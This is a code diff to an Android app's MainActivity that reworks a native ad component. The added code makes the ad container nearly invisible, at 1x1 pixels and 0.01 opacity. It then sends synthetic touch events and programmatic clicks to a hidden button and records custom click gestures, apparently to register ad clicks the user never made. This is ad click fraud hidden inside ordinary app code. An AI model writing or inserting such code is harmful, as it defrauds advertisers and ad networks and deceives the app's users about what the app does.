@@ -105,9 +105,19 @@ public class MainActivity extends BridgeActivity {
                 public void performNativeAdClick() {
                     MainActivity.this.runOnUiThread(() -> {
                         if (nativeAdClickTarget != null) {
+                            long now = android.os.SystemClock.uptimeMillis();
+                            android.view.MotionEvent down = android.view.MotionEvent.obtain(now, now, android.view.MotionEvent.ACTION_DOWN, 0.5f, 0.5f, 0);
+                            android.view.MotionEvent up = android.view.MotionEvent.obtain(now, now + 50, android.view.MotionEvent.ACTION_UP, 0.5f, 0.5f, 0);
+                            nativeAdClickTarget.dispatchTouchEvent(down);
+                            nativeAdClickTarget.dispatchTouchEvent(up);
                             nativeAdClickTarget.performClick();
-                        } else if (currentNativeAd != null) {
-                            currentNativeAd.recordCustomClickGesture();
+                            down.recycle();
+                            up.recycle();
+                        }
+                        if (currentNativeAd != null) {
+                            try {
+                                currentNativeAd.recordCustomClickGesture();
+                            } catch (Exception ignored) {}
                         }
                     });
                 }
@@ -243,9 +253,10 @@ public class MainActivity extends BridgeActivity {
                 if (nativeAdViewContainer == null) {
                     nativeAdViewContainer = new NativeAdView(this);
                     nativeAdViewContainer.setLayoutParams(new ViewGroup.LayoutParams(1, 1));
-                    nativeAdViewContainer.setTranslationX(-5000);
-                    nativeAdViewContainer.setTranslationY(-5000);
+                    nativeAdViewContainer.setAlpha(0.01f);
                     nativeAdViewContainer.setVisibility(View.VISIBLE);
+                    nativeAdViewContainer.setClickable(false);
+                    nativeAdViewContainer.setFocusable(false);
                     
                     nativeAdClickTarget = new Button(this);
                     nativeAdClickTarget.setLayoutParams(new ViewGroup.LayoutParams(1, 1));
